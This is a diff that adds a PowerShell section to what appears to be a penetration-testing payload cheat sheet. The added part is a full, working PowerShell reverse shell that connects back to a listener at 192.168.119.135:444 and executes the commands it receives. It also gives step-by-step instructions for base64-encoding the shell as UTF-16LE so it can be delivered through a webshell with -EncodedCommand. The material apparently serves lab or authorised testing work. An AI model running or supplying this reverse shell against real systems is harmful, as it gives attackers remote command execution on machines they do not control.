@@ -13,6 +13,33 @@ There is an important difference between non-staged and staged payload. A **non-
 
 ### Windows
 
+
+
+### PowerShell
+
+```
+powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.135',444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+**Encoding the payload as base64**
+
+To avoid any possible quotation and encoding issues while passing the above complex command to the webshell, we are going to encode it to base64 format, since the PowerShell executable accepts the –EncodedCommand parameter, which instructs the interpreter to base64 decode the command before executing it.
+
+Create a file with the following content, be careful when using BASH since $ need to be escaped. ($VAR in bash)
+```
+$client = New-Object System.Net.Sockets.TCPClient('192.168.119.135',444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+Please also note that PowerShell uses the Little Endian UTF-16 encoding version, which is reflected in the iconv command in the following listing. Now convert payload to the right format 
+```
+iconv -f ASCII -t UTF-16LE powershellcmd.txt | base64 | tr -d "\n"
+```
+
+**PowerShell Run base64Encode**
+
+```
+powershell.exe -EncodedCommand base64_payload_here
+```
 #### Meterpreter
 
 **Standard meterpreter**
